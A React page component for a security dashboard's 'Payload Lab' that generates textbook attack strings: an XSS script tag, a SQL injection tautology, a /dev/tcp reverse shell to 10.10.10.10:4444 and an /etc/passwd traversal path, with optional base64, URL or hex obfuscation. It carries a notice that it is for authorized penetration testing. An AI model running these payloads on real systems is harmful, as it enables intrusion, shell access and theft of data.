"use client";

import { useState } from 'react';
import { Sidebar } from '../../components/DashboardComponents';
import { useTranslation } from '../../context/LanguageContext';
import { useDefense } from '../../context/DefenseContext';

export default function PayloadLab() {
    const { t } = useTranslation();
    const { notify } = useDefense();
    const [category, setCategory] = useState('XSS');
    const [target, setTarget] = useState('alert("Pwned")');
    const [obfuscation, setObfuscation] = useState('NONE');
    const [payload, setPayload] = useState('');

    const generatePayload = () => {
        let p = '';
        if (category === 'XSS') {
            p = `<script>${target}</script>`;
        } else if (category === 'SQLI') {
            p = `' OR 1=1 -- `;
        } else if (category === 'REV_SHELL') {
            p = `sh -i >& /dev/tcp/10.10.10.10/4444 0>&1`;
        } else if (category === 'LFI') {
            p = `../../../../etc/passwd`;
        }

        // Apply obfuscation
        if (obfuscation === 'BASE64') {
            p = btoa(p);
        } else if (obfuscation === 'URL_ENC') {
            p = encodeURIComponent(p);
        } else if (obfuscation === 'HEX') {
            p = Array.from(p).map(c => '\\x' + c.charCodeAt(0).toString(16)).join('');
        }

        setPayload(p);
        notify('SUCCESS', 'ENGINEERING_COMPLETE', `Generated ${obfuscation}-protected ${category} payload.`);
    };

    return (
        <div className="min-h-screen bg-[#050505] text-[#e0e0e0] font-mono flex relative overflow-hidden">
            <div className="lightning-bg opacity-20"></div>
            <Sidebar />
            <main className="flex-1 p-8 relative z-10 overflow-y-auto">
                <div className="max-w-6xl mx-auto">
                    <header className="mb-12 border-b border-[#00ff88]/20 pb-8">
                        <h1 className="text-6xl font-black text-white tracking-tighter mb-4 uppercase">
                            PAYLOAD_<span className="text-[#00ff88]">LAB</span>
                        </h1>
                        <div className="flex items-center gap-3 text-gray-500 font-bold text-xs uppercase tracking-[0.4em]">
                            <span className="w-2 h-2 bg-[#00ff88] rounded-full animate-ping"></span>
                            OFFENSIVE_VECTOR_FORGE // v9.0-BETA
                        </div>
                    </header>

                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                        {/* Config Panel */}
                        <div className="lg:col-span-4 space-y-6">
                            <div className="glass-card-extreme p-8 border-[#00ff88]/20 shadow-xl">
                                <div className="space-y-8">
                                    <div>
                                        <label className="block text-[10px] font-black text-[#00ff88] uppercase mb-4 tracking-widest">Vector_Category</label>
                                        <div className="grid grid-cols-2 gap-2">
                                            {['XSS', 'SQLI', 'REV_SHELL', 'LFI'].map(cat => (
                                                <button
                                                    key={cat}
                                                    onClick={() => setCategory(cat)}
                                                    className={`py-3 px-2 rounded-lg text-[10px] font-black border transition-all ${category === cat ? 'bg-[#00ff88] text-black border-[#00ff88] shadow-[0_0_15px_rgba(0,255,136,0.3)]' : 'border-white/10 text-gray-500 hover:border-[#00ff88]/50'}`}
                                                >
                                                    {cat}
                                                </button>
                                            ))}
                                        </div>
                                    </div>

                                    <div>
                                        <label className="block text-[10px] font-black text-[#00ff88] uppercase mb-4 tracking-widest">Base_Logic</label>
                                        <input
                                            type="text"
                                            value={target}
                                            onChange={(e) => setTarget(e.target.value)}
                                            className="w-full bg-black border-2 border-white/5 rounded-lg p-3 text-xs text-white outline-none focus:border-[#00ff88]/40"
                                            placeholder="alert(document.cookie)"
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-[10px] font-black text-[#00ff88] uppercase mb-4 tracking-widest">Obfuscation_Layer</label>
                                        <select
                                            value={obfuscation}
                                            onChange={(e) => setObfuscation(e.target.value)}
                                            className="w-full bg-black border-2 border-white/5 rounded-lg p-3 text-xs text-white outline-none focus:border-[#00ff88]/40"
                                        >
                                            <option value="NONE">CLEAR TEXT / NONE</option>
                                            <option value="BASE64">BASE64 ENCODING</option>
                                            <option value="URL_ENC">URL PERCENT ENCODE</option>
                                            <option value="HEX">HEX CHAR ESCAPING</option>
                                        </select>
                                    </div>

                                    <button
                                        onClick={generatePayload}
                                        className="w-full bg-[#00ff88] text-black font-black py-4 rounded-xl hover:shadow-[0_0_30px_rgba(0,255,136,0.4)] active:scale-95 transition-all text-sm tracking-widest"
                                    >
                                        FORGE PAYLOAD
                                    </button>
                                </div>
                            </div>

                            <div className="glass-card-extreme p-8 border-white/5 opacity-50">
                                <div className="text-[9px] font-black text-gray-600 uppercase mb-4 tracking-widest italic">Safety_Notice:</div>
                                <div className="text-[10px] font-bold text-gray-400 italic leading-relaxed uppercase">
                                    Payloads generated are for authorized penetration testing only. ByteGuard assumes zero liability for unauthorized vector deployment.
                                </div>
                            </div>
                        </div>

                        {/* Result Output */}
                        <div className="lg:col-span-8">
                            <div className="glass-card-extreme cyber-border-extreme !p-0 h-full flex flex-col min-h-[500px]">
                                <div className="bg-[#00ff88]/5 p-6 border-b border-[#00ff88]/20 flex justify-between items-center text-[10px] font-black tracking-widest text-[#00ff88] uppercase">
                                    <span>Engineered_Output</span>
                                    <span className="bg-[#00ff88]/20 px-2 py-0.5 rounded text-[8px] animate-pulse">CRYPTOGRAPHIC_READY</span>
                                </div>
                                <div className="p-8 flex-1 flex flex-col">
                                    {payload ? (
                                        <div className="flex-1 flex flex-col gap-6 animate-in zoom-in duration-300">
                                            <div
                                                className="flex-1 bg-black/60 p-8 rounded-2xl border-2 border-dashed border-[#00ff88]/20 font-mono text-xl text-[#00ff88] break-all flex items-center justify-center text-center cursor-copy hover:border-[#00ff88]/50 transition-all select-all shadow-inner"
                                                onClick={() => {
                                                    navigator.clipboard.writeText(payload);
                                                    notify('INFO', 'COPIED_TO_CLIPBOARD', 'Payload added to OS buffer.');
                                                }}
                                            >
                                                {payload}
                                            </div>
                                            <div className="flex items-center gap-4 text-gray-500 font-bold text-[9px] uppercase tracking-widest">
                                                <div className="w-full h-px bg-white/5"></div>
                                                CLICK_BLOCK_TO_COPY
                                                <div className="w-full h-px bg-white/5"></div>
                                            </div>
                                        </div>
                                    ) : (
                                        <div className="flex-1 flex flex-col items-center justify-center opacity-10">
                                            <div className="text-[120px] mb-8 grayscale">🧪</div>
                                            <div className="text-[10px] font-black tracking-[1em] uppercase">No active vector engineered</div>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
